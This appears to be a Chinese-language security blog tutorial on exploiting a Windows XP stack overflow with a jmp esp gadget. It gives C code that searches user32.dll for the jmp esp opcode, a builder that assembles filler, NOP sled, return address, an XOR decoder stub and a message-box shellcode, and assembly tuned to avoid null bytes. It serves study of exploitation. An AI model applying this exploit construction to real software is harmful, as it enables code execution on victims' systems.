---
layout: post
title: Windows Shellcode学习笔记——栈溢出中对jmp esp的利用与优化
---


## 0x00 前言
---

在[《Windows Shellcode学习笔记——shellcode在栈溢出中的利用与优化》](https://3gstudent.github.io/3gstudent.github.io/Windows-Shellcode%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-shellcode%E5%9C%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E4%B8%AD%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E4%BC%98%E5%8C%96/)中对栈溢出的利用做了介绍。通过将返回地址覆盖为shellcode在内存中的起始地址，实现对栈溢出的利用

但是shellcode在内存中的起始地址往往不固定，导致漏洞利用不一定成功，本文将通过jmp esp的方式来解决这个问题

## 0x01 简介
---

函数代码在栈中保存顺序(直观理解，已省略其他细节)：

- buffer
- 前栈帧EBP
- 返回地址
- ESP

ESP寄存器总是指向返回地址的下一地址

如果用jmp esp覆盖返回地址，那么在函数返回后会执行jmp esp，跳到esp，也就是返回地址的下一地址开始执行

因此，将shellcode放于返回地址之后，并将返回地址覆盖为jmp esp，就可以避免shellcode在内存中产生的移位问题


本文将要介绍使用jmp esp的具体细节，并分享如何优化我们自己生成的弹框实例shellcode，实现jmp esp利用，编写程序自动实现，解决shellcode在内存中的起始地址不固定的问题。

**弹框实例shellcode下载地址：**

https://github.com/3gstudent/Shellcode-Generater/blob/master/shellcode.bin


## 0x01 jmp esp
---



**获得jmp esp的机器码：**

可通过搜索各个进程空间来获取，具体原理可参考《0day安全：软件漏洞分析技术》3.2.2节

为便于理解和测试，直接引用《0day安全：软件漏洞分析技术》3.2.2节中的代码，代码如下：

```
#include <stdio.h>
#include <windows.h>
#define DLL_NAME "user32.dll"
int main()
{
	BYTE *ptr;
	int position,address;
	HINSTANCE handle;
	BOOL done_flag=FALSE;
	handle=LoadLibrary(DLL_NAME);
	if(!handle)
	{
		printf("load dll error");
		return 0;
	}
	ptr=(BYTE *)handle;
	for(position=0;!done_flag;position++)
	{
		try
		{
			if(ptr[position]==0xFF &&ptr[position+1]==0xE4)
			{
				int address=(int)ptr+position;
				printf("OPCODE found at 0x%x\n",address);
			}
		}
		catch(...)
		{
		int address=(int)ptr+position;
		printf("END OF 0x%x\n",address);
		done_flag=true;
		}
	}
	return 0;
}
```

如下图，获得机器码，挑选第一个地址0x77d29353，构建我们的shellcode

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-3-2/2-1.png)


初步设想shellcode的结构为：

`填充数据(长度44)+偏移长度+jmp esp的机器码+解码器+加密的弹框shellcode+结束字符`

具体数据为：

`"\x34\x33\x32\x31“*11+"\x90\x90\x90\x90\x90\x90\x90\x90"+"\x53\x93\xD2\x77"+"\x83\xC2\x14\x33\xC9\x8A\x1C\x0A\x80\xF3\x44\x88\x1C\x0A\x41\x80\xFB\x91\x75\xF1"+加密的弹框shellcode+\xD5`

通过程序自动实现此过程，代码如下：

```
#include <windows.h>
size_t GetSize(char * szFilePath)
{
	size_t size;
	FILE* f = fopen(szFilePath, "rb");
	fseek(f, 0, SEEK_END);
	size = ftell(f);
	rewind(f);
	fclose(f);
	return size;
}
unsigned char* ReadBinaryFile(char *szFilePath, size_t *size)
{
	unsigned char *p = NULL;
	FILE* f = NULL;
	size_t res = 0;
	*size = GetSize(szFilePath);
	if (*size == 0) return NULL;		
	f = fopen(szFilePath, "rb");
	if (f == NULL)
	{
		printf("Binary file does not exists!\n");
		return 0;
	}
	p = new unsigned char[*size];
	rewind(f);
	res = fread(p, sizeof(unsigned char), *size, f);
	fclose(f);
	if (res == 0)
	{
		delete[] p;
		return NULL;
	}
	return p;
}
int main(int argc, char* argv[])
{
	char *szFilePath="c:\\test\\shellcode.bin";
	char *szFilePath2="c:\\test\\shellcode2.bin";
	unsigned char *BinData = NULL;
	size_t size = 0;	
	BinData = ReadBinaryFile(szFilePath, &size);
	for(int i=0;i<size;i++)
	{
		BinData[i]=BinData[i]^0x44;
	}
	FILE* f = NULL;	
	f = fopen(szFilePath2, "wb");
	if (f == NULL)
	{
		printf("Create error\n");
		return 0;
	}
	char filler[]="\x34\x33\x32\x31\x34\x33\x32\x31\x34\x33\x32\x31\x34\x33\x32\x31\x34\x33\x32\x31\x34\x33\x32\x31\x34\x33\x32\x31\x34\x33\x32\x31\x34\x33\x32\x31\x34\x33\x32\x31\x34\x33\x32\x31";
	char nop[]="\x90\x90\x90\x90\x90\x90\x90\x90";
	char jmpesp[]="\x53\x93\xD2\x77";
	char decode[]="\x83\xC2\x14\x33\xC9\x8A\x1C\x0A\x80\xF3\x44\x88\x1C\x0A\x41\x80\xFB\x91\x75\xF1";
	char end[]="\xD5";
	fwrite(filler,sizeof(filler)-1,1,f);
	fwrite(nop,sizeof(nop)-1,1,f);
	fwrite(jmpesp,sizeof(jmpesp)-1,1,f);
	fwrite(decode,sizeof(decode)-1,1,f);
	fwrite(BinData,size,1,f);
	fwrite(end,1,1,f);
	fclose(f);
}
```

运行后生成shellcode2.bin


由于我们自己生成的这个shellcode长度较长，在测试时需要对原书中的栈溢出程序作修改，否则会报错，例如
`if(!(fp=fopen("password.txt","rw+")))`
应修改为
`if(!(fp=fopen("password2.txt","rb")))`

更多细节可参考完整代码，栈溢出测试程序的完整代码已上传至github，地址如下：

https://github.com/3gstudent/Shellcode-Generater/blob/master/stackoverflowExample(jmpesp).cpp

测试栈溢出测试程序

测试环境：

```
测试系统：Win XP
编译器：VC6.0
build版本： debug版本
```


测试栈溢出测试程序，发现报错


## 0x02 shellcode调试与优化
---

使用OllyDbg调试

关键位置按F2下断点，按F9执行到断点处

如下图，成功覆盖返回地址，数值为0x77d29353

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-3-2/2-2.png)


按F8单步执行，跳到JMP ESP，如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-3-2/2-3.png)


接着F8单步执行，如下图，此时EDX寄存器不再保存shellcode起始地址，EDX值为`0x0012FFE0`，而理论上shellcode起始地址应为`0x0012F77C`

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-3-2/2-4.png)

需要找到一个能保存shellcode起始地址的寄存器或者存在某种偏移关系的寄存器

通过进一步调试，发现整个过程EDI寄存器的值保持不变，为 `0X0012F720`，而且shellcode起始地址作了变化，不再是`0x0012F77C`


如下图，在CALL test2.004011A0下断点，shellcode起始地址由0x0012F77C变为0X0012F6F0

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-3-2/2-5.png)

如下图，0x0012F77C已被覆盖，侧面证明shellcode起始地址发生变化

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-3-2/2-6.png)

综上，可大胆推测实际shellcode起始地址=EDI-0X000008F0h


解码器实现思路如下：

通过`EDI-0X000008F0h`来获得shellcode起始地址，并且保存在寄存器EAX中


对应汇编代码如下：

```
void main()
{
	__asm
	{
		sub edi,0x8F0
		mov eax,edi
		add eax,0x28
		xor ecx,ecx
decode_loop:
		mov bl,[eax+ecx]
		xor bl,0x44
		mov [eax+ecx],bl
		inc ecx
		cmp bl,0x91
		jne decode_loop
	}
}
```



提取出机器码为
`"\x81\xEF\xF0\x08\x00\x00\x8B\xC7\x83\xC0\x28\x33\xC9\x8A\x1C\x08\x80\xF3\x44\x88\x1C\x08\x41\x80\xFB\x91\x75\xF1"`

如图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-3-2/2-7.png)

此时又出现\x00字符，实际使用时会被提前截断，所以汇编代码需要作进一步优化：

通过先加后减两步操作，来避免shellcode出现\00字符

**注：**

先减后加会造成越界

先加后减两步操作如下：

`EDI-0X000008F0h=0X0012F720+0X11111111h-0X111119A1h`

由于shellcode前面多了填充数据，所以解码器的偏移也要重新计算，偏移=填充数据长度+解码器长度=0x34+0x26=0x5A

对应完整汇编代码如下：

```
void main()
{
	__asm
	{
		add edi,0X11111111
		sub edi,0X111119A1
		mov eax,edi
		add eax,0x5A
		xor ecx,ecx
decode_loop:
		mov bl,[eax+ecx]
		xor bl,0x44
		mov [eax+ecx],bl
		inc ecx
		cmp bl,0x91
		jne decode_loop
	}
}
```

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-3-2/2-8.png)

如上图，提取机器码为

`"\x81\xC7\x11\x11\x11\x11\x81\xEF\xA1\x19\x11\x11\x8B\xC7\x83\xC0\x5A\x33\xC9\x8A\x1C\x08\x80\xF3\x44\x88\x1C\x08\x41\x80\xFB\x91\x75\xF1"`

如下图，寻址正常，shellcode成功执行

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-3-2/2-9.png)

## 0x03 程序自动实现

将以上代码同获得jmp esp机器码的代码融合，实现自动获取jmp esp的机器码并写入shellcode，完整代码已上传至github：

https://github.com/3gstudent/Shellcode-Generater/blob/master/jmpespshellcode.cpp


**注：**

通过子函数GetAddress()实现自动寻址，需要先从子函数GetAddress()返回int型数据，再在main函数中通过指针读取jmp esp的机器码

如果顺序颠倒，那么地址无法获取

错误的获取地址代码如下：


```
unsigned char *GetAddress()
{
	BYTE *ptr;
	int position,address;
	HINSTANCE handle;
	BOOL done_flag=FALSE;
	handle=LoadLibrary(DLL_NAME);
	if(!handle)
	{
		printf("load dll error");
		return 0;
	}
	ptr=(BYTE *)handle;
	for(position=0;!done_flag;position++)
	{
		try
		{
			if(ptr[position]==0xFF &&ptr[position+1]==0xE4)
			{
				int address=(int)ptr+position;
				unsigned char *Buff=(unsigned char *)&address;
				return Buff;				
			}			
		}
		catch(...)
		{
		int address=(int)ptr+position;
		printf("END OF 0x%x\n",address);
		done_flag=true;
		}
	}
	return 0;
}
unsigned char *jmpesp=NULL;
jmpesp=GetAddress();
```


## 0x04 小结
---


本文介绍了栈溢出中使用jmp esp的利用方法，结合遇到的实际情况对我们自己生成的弹框实例shellcode作优化，选取固定寄存器地址，计算偏移，最终定位shellcode起始地址，完成利用。


---


[LEAVE A REPLY](https://github.com/3gstudent/feedback/issues/new)




